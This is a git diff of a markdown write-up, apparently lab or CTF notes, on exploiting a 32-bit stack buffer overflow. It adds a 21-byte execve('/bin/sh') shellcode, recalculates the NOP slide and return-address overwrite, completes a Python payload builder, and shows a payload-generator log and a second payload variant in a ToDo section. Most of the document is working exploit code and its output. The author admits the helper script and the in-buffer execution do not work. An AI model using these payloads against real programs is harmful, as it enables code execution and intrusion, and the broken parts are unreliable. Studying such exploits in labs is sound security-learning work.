@@ -20,10 +20,16 @@ NOT Overwriting $ebp, we get workable space as `72 bytes`
 
 # Shellcode
 
-Spwan a /bin/sh session with `x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
+Spwan a /bin/sh session with 
+```
+buf = ""
+buf += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
+buf += "\x73\x68\x68\x2f\x62\x69\x6e\x89"
+buf += "\xe3\xb0\x0b\xcd\x80"
+```
 
 - Shellcode selected - execve(/bin/sh) 
-- Shellcode length = 25 bytes
+- Shellcode length = 21 bytes
 
 # Payload Generation
 
@@ -31,36 +37,82 @@ Spwan a /bin/sh session with `x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6
 - Rest to overwrite the return pointer (after $ebp)
 
 ## Structure
-- NOP Slide length = 72-25 = 47 NOPS
-- shellcode of 25 bytes
+- NOP Slide length = 72-21 = 51 NOPS
+- shellcode of 21 bytes
 - ebp overwritten
 - eip points to middle of NOP Slide .
 
 ```python
 # pointerTo(start of buffer) + lengthOfNOPS//2
->>> hex(int(0xbffffc60) + 47//2)
-'0xbffffc77'
+>>> hex(int(0xbffffc60) + 51//2)
+'0xbffffc79'
 ```
-- Middle of Nop slide = `0xbffffc77`
+- Middle of Nop slide = `0xbffffc79`
 
-Hence, $eip to be overwritten to `0xbffffc77`
+Hence, $eip to be overwritten to `0xbffffc79`
 
 # Exploit
 
 ```python
 import struct
 
-nop_slide = '\x90'*47
+nop_slide = '\x90'*51
 
-# shellcode = 'x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+shellcode = ""
+shellcode += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
+shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89"
+shellcode += "\xe3\xb0\x0b\xcd\x80"
 
-# debug
-shellcode = '\xCC'*25
+# "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
 
 ebp = 'BBBB'
-eip = struct.pack("I",0xbffffc77)
+eip = struct.pack("I",0xbffffc79)
 
 payload = nop_slide + shellcode + ebp + eip
 print(payload)
 
+```
+
+Even made a script [stacksploit.py](stacksploit.py) to help with this but it doesn't work lol 
+```log
+$ python3 stacksploit.py
+[+] Printing String to help with buffer exploration :
+[+] AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+[+] Start of buffer (hex) : 0xbffffc60
+[+] Enter BasePointer $ebp (hex) value : 0x53535353
+[+] Workspace area (total) is of 72 bytes
+[+] Enter shellcode : \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+[+] Shellcode of size 21 bytes
+[+] NOP Slide size 51 bytes
+[+] RET addr will be overwritten to 0xbffffc79
+[+] Generating payload
+ +--------------------------------------------------------------------------------+
+ |   0x  bffffc60   |   51   | 0x  bffffc93   ||  Adding NOPs                     | 
+ |   0x  bffffc93   |   21   | 0x  bffffca8   ||  Added Shellcode                 | 
+ |   0x  bffffca8   |    4   | 0x  bffffcac   ||  Overwriting BasePointer         | 
+ |   0x  bffffcac   |    4   | 0x  bffffcb0   ||  Wrote Jump Address              | 
+ +--------------------------------------------------------------------------------+
+[+] Generated Payload | Size 88 bytes
+[+] Payload written to file
+```
+
+# ToDo
+
+For some reason i am not able to execute shellcode inside the buffer because this works
+
+```python
+import struct
+
+nop_slide = '\x90'*72
+
+shellcode = ""
+shellcode += "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f"
+shellcode += "\x73\x68\x68\x2f\x62\x69\x6e\x89"
+shellcode += "\xe3\xb0\x0b\xcd\x80"
+
+ebp = 'BBBB'
+eip = struct.pack("I",0xbffffcd0)
+
+payload = nop_slide + ebp + eip + nop_slide + shellcode
+print(payload)
 ```
